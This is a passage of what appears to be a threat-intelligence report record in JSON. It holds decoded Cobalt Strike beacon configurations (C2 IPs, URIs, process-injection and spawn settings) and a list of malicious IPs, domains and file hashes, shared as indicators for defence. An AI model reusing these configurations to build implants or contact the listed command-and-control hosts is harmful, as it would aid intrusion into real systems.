\"dns_idle\": null,\n    \"dns_sleep\": null,\n    \"maxdns\": null,\n    \"beacon\": null,\n    \"get_A\": null,\n    \"get_AAAA\": null,\n    \"get_TXT\": null,\n    \"put_metadata\": null,\n    \"put_output\": null\n  },\n  \"pipename\": null,\n  \"smb_frame_header\": \"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\",\n  \"stage\": {\n    \"cleanup\": true\n  },\n  \"ssh\": {\n    \"hostname\": null,\n    \"port\": null,\n    \"username\": null,\n    \"password\": null,\n    \"privatekey\": null\n  }\n}</code></pre><p>&nbsp;</p><pre><code class=\"language-plaintext\">{\n    \"beacontype\": [\n        \"HTTPS\"\n    ],\n    \"sleeptime\": 60000,\n    \"jitter\": 0,\n    \"maxgetsize\": 1048576,\n    \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA==\",\n    \"license_id\": 0,\n    \"cfg_caution\": false,\n    \"kill_date\": null,\n    \"server\": {\n        \"hostname\": \"111[.]90[.]143[.]191\",\n        \"port\": 443,\n        \"publickey\": \"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnOM3nXx+7HBhkbDd+AwFrFisSunK999w2tM0uTpuuEiBalcJhcL+QgQWtf6S7zPp5hjImG+2YcPl18geU4f5JlSPXHwilbK4DFb/ePWyKFjhrA7emVRqhM21QMlo1ANsn14rY/RO2pzuft8P7TXoIjjI/B2GGVuzYNZX6X4I2EwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\"\n    },\n    \"host_header\": \"\",\n    \"useragent_header\": null,\n    \"http-get\": {\n        \"uri\": \"/j[.]ad\",\n        \"verb\": \"GET\",\n        \"client\": {\n            \"headers\": null,\n            \"metadata\": null\n        },\n        \"server\": {\n            \"output\": [\n                \"print\"\n            ]\n        }\n    },\n    \"http-post\": {\n        \"uri\": \"/submit.php\",\n        \"verb\": \"POST\",\n        \"client\": {\n            \"headers\": null,\n            \"id\": null,\n            \"output\": null\n        }\n    },\n    \"tcp_frame_header\": \"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\",\n    \"crypto_scheme\": 0,\n    \"proxy\": {\n        \"type\": null,\n        \"username\": null,\n        \"password\": null,\n        \"behavior\": \"Use IE settings\"\n    },\n    \"http_post_chunk\": 0,\n    \"uses_cookies\": true,\n    \"post-ex\": {\n        \"spawnto_x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\",\n        \"spawnto_x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\"\n    },\n    \"process-inject\": {\n        \"allocator\": \"VirtualAllocEx\",\n        \"execute\": [\n            \"CreateThread\",\n            \"SetThreadContext\",\n            \"CreateRemoteThread\",\n            \"RtlCreateUserThread\"\n        ],\n        \"min_alloc\": 0,\n        \"startrwx\": true,\n        \"stub\": \"Ms1B7fCBDFtfSY7fRzHMbQ==\",\n        \"transform-x86\": null,\n        \"transform-x64\": null,\n        \"userwx\": true\n    },\n    \"dns-beacon\": {\n        \"dns_idle\": null,\n        \"dns_sleep\": null,\n        \"maxdns\": null,\n        \"beacon\": null,\n        \"get_A\": null,\n        \"get_AAAA\": null,\n        \"get_TXT\": null,\n        \"put_metadata\": null,\n        \"put_output\": null\n    },\n    \"pipename\": null,\n    \"smb_frame_header\": \"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\",\n    \"stage\": {\n        \"cleanup\": false\n    },\n    \"ssh\": {\n        \"hostname\": null,\n        \"port\": null,\n        \"username\": null,\n        \"password\": null,\n        \"privatekey\": null\n    }\n}</code></pre><p>&nbsp;</p><pre><code class=\"language-plaintext\">\n{\n    \"beacontype\": [\n        \"HTTPS\"\n    ],\n    \"sleeptime\": 60000,\n    \"jitter\": 0,\n    \"maxgetsize\": 1048576,\n    \"spawnto\": \"AAAAAAAAAAAAAAAAAAAAAA==\",\n    \"license_id\": 305419776,\n    \"cfg_caution\": false,\n    \"kill_date\": null,\n    \"server\": {\n        \"hostname\": \"78[.]128[.]112[.]139\",\n        \"port\": 443,\n        \"publickey\": \"MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCnOM3nXx+7HBhkbDd+AwFrFisSunK999w2tM0uTpuuEiBalcJhcL+QgQWtf6S7zPp5hjImG+2YcPl18geU4f5JlSPXHwilbK4DFb/ePWyKFjhrA7emVRqhM21QMlo1ANsn14rY/RO2pzuft8P7TXoIjjI/B2GGVuzYNZX6X4I2EwIDAQABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==\"\n    },\n    \"host_header\": \"\",\n    \"useragent_header\": null,\n    \"http-get\": {\n        \"uri\": \"/ga.js\",\n        \"verb\": \"GET\",\n        \"client\": {\n            \"headers\": null,\n            \"metadata\": null\n        },\n        \"server\": {\n            \"output\": [\n                \"print\"\n            ]\n        }\n    },\n    \"http-post\": {\n        \"uri\": \"/submit.php\",\n        \"verb\": \"POST\",\n        \"client\": {\n            \"headers\": null,\n            \"id\": null,\n            \"output\": null\n        }\n    },\n    \"tcp_frame_header\": \"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\",\n    \"crypto_scheme\": 0,\n    \"proxy\": {\n        \"type\": null,\n        \"username\": null,\n        \"password\": null,\n        \"behavior\": \"Use IE settings\"\n    },\n    \"http_post_chunk\": 0,\n    \"uses_cookies\": true,\n    \"post-ex\": {\n        \"spawnto_x86\": \"%windir%\\\\syswow64\\\\rundll32.exe\",\n        \"spawnto_x64\": \"%windir%\\\\sysnative\\\\rundll32.exe\"\n    },\n    \"process-inject\": {\n        \"allocator\": \"VirtualAllocEx\",\n        \"execute\": [\n            \"CreateThread\",\n            \"SetThreadContext\",\n            \"CreateRemoteThread\",\n            \"RtlCreateUserThread\"\n        ],\n        \"min_alloc\": 0,\n        \"startrwx\": true,\n        \"stub\": \"tUr+Aexqde3zXhpE+L05KQ==\",\n        \"transform-x86\": null,\n        \"transform-x64\": null,\n        \"userwx\": true\n    },\n    \"dns-beacon\": {\n        \"dns_idle\": null,\n        \"dns_sleep\": null,\n        \"maxdns\": null,\n        \"beacon\": null,\n        \"get_A\": null,\n        \"get_AAAA\": null,\n        \"get_TXT\": null,\n        \"put_metadata\": null,\n        \"put_output\": null\n    },\n    \"pipename\": null,\n    \"smb_frame_header\": \"AAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=\",\n    \"stage\": {\n        \"cleanup\": false\n    },\n    \"ssh\": {\n        \"hostname\": null,\n        \"port\": null,\n        \"username\": null,\n        \"password\": null,\n        \"privatekey\": null\n    }\n}</code></pre>",
+ "displayOptions": {
+  "isFavourite": false,
+  "isHidden": false
+ },
+ "evaluation": {
+  "admiraltyCode": "B2",
+  "credibility": 80,
+  "reliability": 80,
+  "severity": "orange",
+  "tlp": "amber",
+  "ttl": null
+ },
+ "expertise": [],
+ "files": [
+  {
+   "hash": "0fe1cbca362fac6d373929b4f210b2049dda2fa25ba7a84dd1405d744ea71b63",
+   "mime": "image/png",
+   "name": "0fe1cbca362fac6d373929b4f210b2049dda2fa25ba7a84dd1405d744ea71b63",
+   "size": 276475
+  }
+ ],
+ "forumsAccounts": [],
+ "fraudMatrix": [],
+ "hasIocs": true,
+ "id": "9f4e535fcdbbd35cb49b04f03cfaccf33e312942",
+ "indicatorMalwareRelationships": [
+  {
+   "indicatorId": "b464462341f8234082dfa7b89a3372d33703c2e8",
+   "malwareId": "b69fc9d439d2fd41e98a7e3c60b9a55340012eb6"
+  },
+  {
+   "indicatorId": "f8f69cee08773d91b339ca492084651f921bae7a",
+   "malwareId": "1f21cb2fdd76159d7e5b387c8541181e009fbf35"
+  },
+  {
+   "indicatorId": "18cc5a535e03093c49a4df5e42685568a8363213",
+   "malwareId": "3d86fa0fce495ea07d119f7e381e1c857b69de29"
+  },
+  {
+   "indicatorId": "0479e1294355495fc384eaf3ce17065986100562",
+   "malwareId": "b69fc9d439d2fd41e98a7e3c60b9a55340012eb6"
+  }
+ ],
+ "indicatorRelationships": [],
+ "indicatorToolRelationships": [],
+ "indicators": [
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-07-20",
+   "dateLastSeen": "2023-07-20",
+   "domain": null,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "54bf357860bab474a3f8f55a25c33e94d2a3bb70",
+   "ip": [
+    "199.127.60.117"
+   ],
+   "ipScores": [
+    {
+     "ip": "199.127.60.117",
+     "score": 35
+    }
+   ],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [
+     "199.127.60.117"
+    ],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 16898645183252,
+   "sources": [],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-07-20",
+   "dateLastSeen": "2023-07-20",
+   "domain": null,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "98e4de83c180d1c473d9c7a0b863370b7517d70a",
+   "ip": [
+    "45.66.151.109"
+   ],
+   "ipScores": [
+    {
+     "ip": "45.66.151.109",
+     "score": 35
+    }
+   ],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [
+     "45.66.151.109"
+    ],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 16898644212863,
+   "sources": [],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2022-10-01",
+   "dateLastSeen": "2022-10-15",
+   "domain": null,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "5b5918cb3bdd3c76cb584f5554b0afff37272d95",
+   "ip": [
+    "5.252.177.10"
+   ],
+   "ipScores": [
+    {
+     "ip": "5.252.177.10",
+     "score": 35
+    }
+   ],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [
+     "5.252.177.10"
+    ],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [
+    "e254c7b6978f298cca0e319b26fa414c2d14a3c8"
+   ],
+   "malwareList": [],
+   "seqUpdate": 17889975095868,
+   "sources": [
+    "panda"
+   ],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2022-09-28",
+   "dateLastSeen": "2022-09-29",
+   "domain": "considerf.info",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "cbe93ec794da606eda9479aafe501589f588f4d0",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "",
+    "domain": "considerf.info",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [
+    "e254c7b6978f298cca0e319b26fa414c2d14a3c8"
+   ],
+   "malwareList": [],
+   "seqUpdate": 17889975106582,
+   "sources": [
+    "panda"
+   ],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2022-10-11",
+   "dateLastSeen": "2022-10-11",
+   "domain": "antiflamez.bar",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "99bb61a491f5fa8d2c2c83aa081eaa28ee5c92f9",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "",
+    "domain": "antiflamez.bar",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [
+    "e254c7b6978f298cca0e319b26fa414c2d14a3c8"
+   ],
+   "malwareList": [],
+   "seqUpdate": 17889743212712,
+   "sources": [
+    "panda"
+   ],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-07-20",
+   "dateLastSeen": "2023-07-20",
+   "domain": null,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "5fac981f9e85bee4d626d1ff9bbc77cfb12079c7",
+   "ip": [
+    "66.63.188.70"
+   ],
+   "ipScores": [
+    {
+     "ip": "66.63.188.70",
+     "score": 35
+    }
+   ],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [
+     "66.63.188.70"
+    ],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 16898642478634,
+   "sources": [],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-07-20",
+   "dateLastSeen": "2023-07-20",
+   "domain": "guteyutu.com",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "4699dd6e374a7ef57be3ee1f0a750efd279ffa4b",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "",
+    "domain": "guteyutu.com",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 16898644211878,
+   "sources": [],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-07-20",
+   "dateLastSeen": "2023-07-20",
+   "domain": null,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "f632482bfee6e8a635a4883185d81a30a7e40021",
+   "ip": [
+    "172.93.181.165"
+   ],
+   "ipScores": [
+    {
+     "ip": "172.93.181.165",
+     "score": 35
+    }
+   ],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [
+     "172.93.181.165"
+    ],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 16898644213965,
+   "sources": [],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-07-20",
+   "dateLastSeen": "2023-07-20",
+   "domain": "opiransiuera.com",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "49bf3f87a0e0c596d84b5d870023c4c2f9931e87",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "",
+    "domain": "opiransiuera.com",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 16898642467447,
+   "sources": [],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2022-09-17",
+   "dateLastSeen": "2022-09-18",
+   "domain": "erinindiaka.quest",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "3c8260d381b2539095be463bf59c1b4746517213",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "",
+    "domain": "erinindiaka.quest",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [
+    "e254c7b6978f298cca0e319b26fa414c2d14a3c8"
+   ],
+   "malwareList": [],
+   "seqUpdate": 17889959468916,
+   "sources": [
+    "panda"
+   ],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-07-20",
+   "dateLastSeen": "2023-07-20",
+   "domain": null,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "c7dbf12af1919fd764b3c84274a12b5a0a9d807c",
+   "ip": [
+    "46.101.19.119"
+   ],
+   "ipScores": [
+    {
+     "ip": "46.101.19.119",
+     "score": 35
+    }
+   ],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [
+     "46.101.19.119"
+    ],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 16898642483729,
+   "sources": [],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-07-20",
+   "dateLastSeen": "2023-07-20",
+   "domain": "zoomersoidfor.com",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "27d7d74d20e3eb9b42ddab93fc3f205970423861",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "",
+    "domain": "zoomersoidfor.com",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 16898642463849,
+   "sources": [],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-07-20",
+   "dateLastSeen": "2023-07-20",
+   "domain": "onlinecloud.cloud",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "60c8b09054f2682505dfe437512f127a8973b5ef",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "",
+    "domain": "onlinecloud.cloud",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 16898642474150,
+   "sources": [],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-07-20",
+   "dateLastSeen": "2023-07-20",
+   "domain": "fazehotafa.com",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "30af90bddbb936820d57af842078f7304e4ac984",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "",
+    "domain": "fazehotafa.com",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 16898644211147,
+   "sources": [],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-07-20",
+   "dateLastSeen": "2023-07-20",
+   "domain": null,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "a9c8b5fb9c500bcc45022e4352c5efc8e1b0bcd9",
+   "ip": [
+    "111.90.143.191"
+   ],
+   "ipScores": [
+    {
+     "ip": "111.90.143.191",
+     "score": 35
+    }
+   ],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [
+     "111.90.143.191"
+    ],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 16898644214805,
+   "sources": [],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2022-09-28",
+   "dateLastSeen": "2022-10-03",
+   "domain": null,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "e20c8cc81b83da0864932d3e264b9b1d8ba9f643",
+   "ip": [
+    "64.227.12.180"
+   ],
+   "ipScores": [
+    {
+     "ip": "64.227.12.180",
+     "score": 35
+    }
+   ],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [
+     "64.227.12.180"
+    ],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [
+    "e254c7b6978f298cca0e319b26fa414c2d14a3c8"
+   ],
+   "malwareList": [],
+   "seqUpdate": 17889969849279,
+   "sources": [
+    "panda"
+   ],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-07-20",
+   "dateLastSeen": "2023-07-20",
+   "domain": null,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "96d6eb3e5cb81796fff27990022334c53f876807",
+   "ip": [
+    "5.196.103.145"
+   ],
+   "ipScores": [
+    {
+     "ip": "5.196.103.145",
+     "score": 35
+    }
+   ],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [
+     "5.196.103.145"
+    ],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 16898642477117,
+   "sources": [],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-07-20",
+   "dateLastSeen": "2023-07-20",
+   "domain": null,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "7c57d90c8808498884071d9b4c36b103ff9b5416",
+   "ip": [
+    "178.128.85.30"
+   ],
+   "ipScores": [
+    {
+     "ip": "178.128.85.30",
+     "score": 35
+    }
+   ],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [
+     "178.128.85.30"
+    ],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 16898642480715,
+   "sources": [],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-07-20",
+   "dateLastSeen": "2023-07-20",
+   "domain": null,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "47fc518df5c06c89821d85c01bb9835016ace812",
+   "ip": [
+    "199.101.184.230"
+   ],
+   "ipScores": [
+    {
+     "ip": "199.101.184.230",
+     "score": 35
+    }
+   ],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [
+     "199.101.184.230"
+    ],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 16898645185546,
+   "sources": [],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2022-09-29",
+   "dateLastSeen": "2024-03-07",
+   "domain": "alockajilly.com",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "5302b9983e82114b5325e52942ead83db774d864",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "",
+    "domain": "alockajilly.com",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [
+    "e254c7b6978f298cca0e319b26fa414c2d14a3c8"
+   ],
+   "malwareList": [],
+   "seqUpdate": 17889969837584,
+   "sources": [
+    "alerts",
+    "panda"
+   ],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-07-20",
+   "dateLastSeen": "2023-07-20",
+   "domain": "choifejuce.lol",
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "5682998a6d0c193d943af15f21b37315e10b200e",
+   "ip": [],
+   "ipScores": [],
+   "params": {
+    "url": "",
+    "domain": "choifejuce.lol",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [],
+   "malwareList": [],
+   "seqUpdate": 16898642465748,
+   "sources": [],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2022-10-31",
+   "dateLastSeen": "2022-11-03",
+   "domain": null,
+   "hashes": {
+    "md5": null,
+    "other": [],
+    "sha1": null,
+    "sha256": null
+   },
+   "id": "86df37868b9c711f36fb01a438fdb550384c2b05",
+   "ip": [
+    "78.128.112.139"
+   ],
+   "ipScores": [
+    {
+     "ip": "78.128.112.139",
+     "score": 35
+    }
+   ],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [
+     "78.128.112.139"
+    ],
+    "ipv6": [],
+    "hashes": {
+     "md5": "",
+     "sha1": "",
+     "sha256": ""
+    },
+    "ssl": []
+   },
+   "malwareIdList": [
+    "b69fc9d439d2fd41e98a7e3c60b9a55340012eb6"
+   ],
+   "malwareList": [],
+   "seqUpdate": 17893520554045,
+   "sources": [
+    "panda"
+   ],
+   "taIdList": [],
+   "type": "network",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2026-01-09",
+   "dateLastSeen": "2026-05-25",
+   "domain": null,
+   "hasPolygonReport": false,
+   "hashes": {
+    "md5": "dbb08886c60f3c44b377d09bd9d8b6d3",
+    "other": [],
+    "sha1": "7262b7df4d90409fb141856d9b55792872deda20",
+    "sha256": "8f7cc7cc14a12753d41678981b929546d12218d457a9d22951808cb5f19e549c"
+   },
+   "id": "b464462341f8234082dfa7b89a3372d33703c2e8",
+   "ip": [],
+   "params": {
+    "url": "",
+    "domain": "",
+    "ipv4": [],
+    "ipv6": [],
+    "hashes": {
+     "md5": "dbb08886c60f3c44b377d09bd9d8b6d3",
+     "sha1": "7262b7df4d90409fb141856d9b55792872deda20",
+     "sha256": "8f7cc7cc14a12753d41678981b929546d12218d457a9d22951808cb5f19e549c"
+    },
+    "name": "beaconM-1664297797-T0B9Z_32-cr.exe",
+    "nameList": [
+     "beaconM-1664297797-T0B9Z_32-cr.exe"
+    ],
+    "size": null
+   },
+   "malwareIdList": [
+    "b69fc9d439d2fd41e98a7e3c60b9a55340012eb6"
+   ],
+   "malwareList": [
+    {
+     "category": [],
+     "class": null,
+     "id": "b69fc9d439d2fd41e98a7e3c60b9a55340012eb6",
+     "name": "Cobalt Strike",
+     "platform": [],
+     "threatLevel": null
+    }
+   ],
+   "potentialNames": [
+    "beaconM-1664297797-T0B9Z_32-cr.exe"
+   ],
+   "seqUpdate": 17810072720891,
+   "size": null,
+   "sources": [
+    "tap"
+   ],
+   "taIdList": [],
+   "type": "file",
+   "url": null
+  },
+  {
+   "attributes": null,
+   "dateFirstSeen": "2023-09-20",
+   "dateLastSeen": "2023-09-20",
+   "domain": null,
+   "hasPolygonReport": false,
+   "hashes": {
+    "md5": "9bd6b1f24b9589a3fbc1d54b6e6184b8",
+    "other": [],
+    "sha1": "f8473c6c8b298a3d72c8ca890667eddab62d2ba8",
+    "sha256": "03a9d6afc99e70333723d921bd1265ac948cdabb8b15689b5ceb1c02365a9572"
+   },
+   "id": "c80b4a1ece4f694cd9dcc6d829029e1dd969fac3",
